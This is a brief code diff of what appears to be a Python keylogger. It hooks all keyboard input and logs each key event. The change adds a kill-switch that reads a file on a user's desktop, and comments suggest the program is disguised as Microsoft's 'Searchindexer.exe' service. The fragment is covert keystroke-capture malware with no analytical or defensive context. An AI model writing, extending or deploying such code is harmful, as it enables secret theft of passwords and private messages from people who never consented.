@@ -8,8 +8,10 @@ def save_key(event):
     logging.info(str(event))
 
 
-keyboard.hook(save_key)
-keyboard.wait()
+with open('C:/Users/nikot/Desktop/1.txt', 'r') as file:
+    if file.read() != '1':
+        keyboard.hook(save_key)
+        keyboard.wait()
 
 # Searchindexer.exe
 # индексатор службы Microsoft
